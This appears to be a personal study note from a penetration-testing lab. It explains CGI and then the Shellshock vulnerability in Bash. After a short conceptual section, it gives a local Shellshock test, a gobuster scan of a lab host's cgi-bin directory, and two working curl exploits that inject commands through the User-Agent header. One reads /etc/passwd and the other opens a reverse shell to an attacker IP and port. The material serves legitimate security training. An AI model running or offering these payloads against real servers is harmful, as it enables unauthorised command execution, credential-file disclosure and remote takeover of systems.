# What are CGIs
* [Common Gateway Interface](https://www.w3.org/CGI/)
* Used to render dynamic pages and create a customised response for the user
* Kept in `/CGI-bin` directory and can be written in C, C++, Java, Perl and more
* Typically used for a number of reasons:
	* Webserver must dynamically interact with the user
	* When a user submits data to the web server by filling out a form, the CGI application would process the data and return the result to the user via the webserver. 
![[Pasted image 20231019131754.png]]
* A directory is created on the web server containg the CGI scripts/applications. 
* Web application user sends a request to the server. 
* The server runs the script and passed the resultant output back to the web client.
# CGI Attacks 
## Shellshock via CGI
* Allows an attacker to exploit old version of Bash that save environment variables incorrectly. 
* Vulnerable versions would allow an attacker to execute OS commands after a function stored in an environmental variable. 
### Test
```shell
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
* Bash will interpret `y='() { :;};` as a function assigned to the variable `y`. This just returns an exit 0. 
* If the bash is vulnerable it will return `vulnerable-shellshock` when the function is imported. 

## Find a vulnerability
Look for CGI scripts
```shell
 gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
Test:
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
Reverse Shell:
```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
